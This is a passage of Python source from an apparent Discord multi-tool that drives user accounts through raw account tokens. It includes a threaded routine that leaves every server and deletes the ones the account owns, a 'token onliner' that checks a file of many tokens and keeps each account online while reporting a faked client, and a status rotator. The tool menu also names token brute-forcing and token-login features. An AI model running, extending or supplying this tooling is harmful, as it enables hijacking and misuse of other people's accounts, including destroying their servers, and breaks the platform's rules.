    preview.add_column("", style=C.C_GOLD)
    for g in guilds[:15]:
        preview.add_row(g.get("name", "?"), str(g.get("id", "?")), t("gl_owner") if g.get("owner") else "—")
    if len(guilds) > 15:
        preview.add_row(f"… +{len(guilds) - 15}", "", "")
    console.print(Padding(Panel(
        preview, title=f"[{C.C_GOLD} bold]{len(guilds)} {t('guilds')}[/]",
        border_style=_pal()["blood"], width=_tw(),
    ), (1, 0)))
    if not _confirm(t("gl_confirm")):
        _hint(t("cancelled"))
        return
    results = {"left": 0, "deleted": 0, "failed": 0}
    rlock = threading.Lock()

    def leave_one(g):
        gid, name = g.get("id"), g.get("name", "?")
        if g.get("owner"):
            url, action = f"https://discord.com/api/v9/guilds/{gid}", "deleted"
        else:
            url, action = f"https://discord.com/api/v9/users/@me/guilds/{gid}", "left"
        lc, _ = _api("DELETE", url, token=token)
        with rlock:
            if lc in (200, 204):
                results[action] += 1
            else:
                results["failed"] += 1
        return name, action if lc in (200, 204) else "failed", lc

    log_rows = []
    p = _pal()
    with Progress(
        SpinnerColumn(style=C.C_GOLD),
        BarColumn(bar_width=30, complete_style=p["neon"], finished_style=C_OK),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as prog:
        task = prog.add_task(t("gl_running"), total=len(guilds))
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as pool:
            for name, action, lc in pool.map(leave_one, guilds):
                sym = f"[{C_OK}]✔[/]" if action != "failed" else f"[{C_ERR}]✗[/]"
                log_rows.append((sym, name, action if action != "failed" else f"HTTP {lc}"))
                prog.advance(task)
    for sym, name, action in log_rows[:20]:
        console.print(f"  {sym}  {name}  [{C.C_DIM}]{action}[/]")
    if len(log_rows) > 20:
        _hint(f"… +{len(log_rows) - 20} more")
    _stats_bar([
        (t("gl_left"), results["left"]),
        (t("gl_deleted"), results["deleted"]),
        ("Failed", results["failed"]),
    ])


def _ws_keep_online(token):
    import websocket
    ws = websocket.WebSocket()
    ws.settimeout(5)
    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
    hello = json.loads(ws.recv())
    interval = hello.get("d", {}).get("heartbeat_interval", 41250) / 1000
    ws.send(json.dumps({
        "op": 2,
        "d": {
            "token": token.strip(),
            "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"},
            "presence": {"status": "online", "since": 0, "activities": [], "afk": False},
        },
    }))
    seq = None
    tag = None
    while True:
        try:
            raw = ws.recv()
            if raw:
                msg = json.loads(raw)
                if msg.get("op") == 0 and msg.get("t") == "READY":
                    tag = _user_tag(_as_dict(msg.get("d", {}).get("user")))
                if msg.get("op") == 0:
                    seq = msg.get("s", seq)
                if msg.get("op") == 1:
                    ws.send(json.dumps({"op": 1, "d": seq}))
        except websocket.WebSocketTimeoutException:
            ws.send(json.dumps({"op": 1, "d": seq}))
        except Exception:
            break
        time.sleep(interval)
    return tag


def token_onliner():
    _panel(t("on_title"), t("on_desc"))
    _mode_menu({"1": t("on_single"), "2": t("on_file")})
    mode = _ask(t("bf_mode")) or "1"
    tokens = []
    if mode == "2":
        fp = _ask(t("bf_file")).strip().strip('"')
        if not fp or not os.path.isfile(fp):
            _fail(t("file_not_found"))
            return
        with open(fp, encoding="utf-8", errors="ignore") as f:
            tokens = [l.strip() for l in f if l.strip()]
    else:
        tok = _ask(t("token_prompt"))
        if tok:
            tokens = [tok]
    valid = []
    for tkn in tokens:
        code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=tkn)
        if code == 200:
            valid.append((tkn, _user_tag(_as_dict(d))))
    if not valid:
        _fail(t("token_invalid"))
        return
    tbl = Table(box=box.SIMPLE, border_style=_pal()["mid"], show_header=True)
    tbl.add_column(t("user"), style="white")
    tbl.add_column("Token", style=C.C_DIM)
    tbl.add_column("Status", style=C.C_GOLD)
    for tkn, tag in valid:
        tbl.add_row(tag, _mask_token(tkn), "● starting…")
    console.print(Padding(Panel(tbl, title=f"[{C.C_GOLD} bold]{t('on_title')}[/]", border_style=_pal()["blood"], width=_tw()), (1, 0)))
    _hint(t("on_ctrlc"))
    for tkn, _ in valid:
        threading.Thread(target=_ws_keep_online, args=(tkn,), daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        _ok(t("on_title"), t("on_stopped"))


def status_rotator():
    _panel(t("sr_title"), t("sr_desc"))
    token = _ask(t("token_prompt"))
    if not token:
        return
    statuses = _load_lines(t("sr_prompt"), t("sr_file"))
    statuses = [s for s in dict.fromkeys(statuses) if s]
    if not statuses:
        return
    try:
        delay = max(3.0, float(_ask(t("sr_delay")) or "5"))
    except ValueError:
        delay = 5.0
    code, d = _api("GET", "https://discord.com/api/v9/users/@me", token=token)
    if code != 200:
        _fail(f"{t('token_invalid')} (HTTP {code})")
        return
    _stats_bar([
        (t("user"), _user_tag(_as_dict(d))),
        (t("sr_statuses"), len(statuses)),
        ("Interval", f"{delay}s"),
    ])
    idx = 0
    p = _pal()
    try:
        with Progress(
            SpinnerColumn(style=C.C_GOLD),
            TextColumn("[bold]{task.description}"),
            BarColumn(bar_width=20, complete_style=p["neon"]),
            TextColumn("{task.fields[idx]}"),
            TimeElapsedColumn(),
            console=console,
        ) as prog:
            task = prog.add_task(t("sr_active"), total=None, idx=f"1/{len(statuses)}")
            while True:
                status = statuses[idx % len(statuses)]
                idx += 1
                sc, _ = _api(
                    "PATCH", "https://discord.com/api/v9/users/@me/settings",
                    token=token, body={"custom_status": {"text": status}},
                )
                mark = f"[{C_OK}]●[/]" if sc in (200, 204) else f"[{C_ERR}]✗[/]"
                prog.update(task, description=f"{mark} {status[:40]}", idx=f"{idx % len(statuses) or len(statuses)}/{len(statuses)}")
                time.sleep(delay)
    except KeyboardInterrupt:
        _ok(t("sr_title"), t("sr_stopped"))


TOOLS = {
    "token-checker": token_checker,
    "server-lookup": server_lookup,
    "server-compare": server_compare,
    "vanity-checker": vanity_checker,
    "user-lookup": user_lookup,
    "token-bruteforce": token_bruteforce,
    "token-login": token_login,
    "status-rotator": status_rotator,
    "token-onliner": token_onliner,
    "guild-leaver": guild_leaver,
}


def run_tool(key):
    os.system("cls" if os.name == "nt" else "clear")
    fn = TOOLS.get(key)
    if not fn:
        _fail(f"{t('unknown')} {key}")
        _pause()
        return
    try:
        fn()
    except KeyboardInterrupt:
        console.print(f"\n  [{C.C_DIM}]○ {t('cancelled')}[/]")
    except requests.RequestException as ex:
        _fail(t("network"), str(ex))
    except Exception as ex:
        _fail(type(ex).__name__, str(ex))
    _pause()
